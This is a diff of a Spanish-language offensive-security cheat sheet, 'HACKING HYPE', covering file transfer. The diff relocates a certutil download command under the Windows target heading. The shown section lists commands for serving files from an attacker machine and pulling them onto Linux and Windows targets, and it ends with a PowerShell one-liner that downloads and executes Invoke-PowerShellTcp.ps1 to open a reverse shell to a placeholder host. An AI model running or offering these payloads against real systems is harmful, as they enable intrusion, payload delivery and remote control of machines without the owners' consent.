@@ -33,17 +33,17 @@ H A C K I N G   H Y P E:
 
 
 TRANSFERENCIA DE ARCHIVOS  
-.........................
+..........................
 
 sudo python -m http.server 80
 sudo python -m SimpleHTTPServer 80
 sudo python smbserver.py [como se llamará el recurso a compartir] [nombre del recurso a compartir] ej smbserver.py compartida /home/kali/Downloads
-certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
 
      Target Linux: 
          wget http://[IP]/recurso
          
      Target Windows:
+         certutil.exe -f -urlcache -split "http://<LHOST>/<FILE>" <FILE>
          powershell -c "Invoke-WebRequest -Uri 'http://[IP]:[PUERTO]/recurso' -OutFile 'C:\Windows\Temp\nombrequequeramos'"
          Invoke-WebRequest http://[IP]/[RECURSO] -OutFile [NOMBREQUEQUERAMOS]
          powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
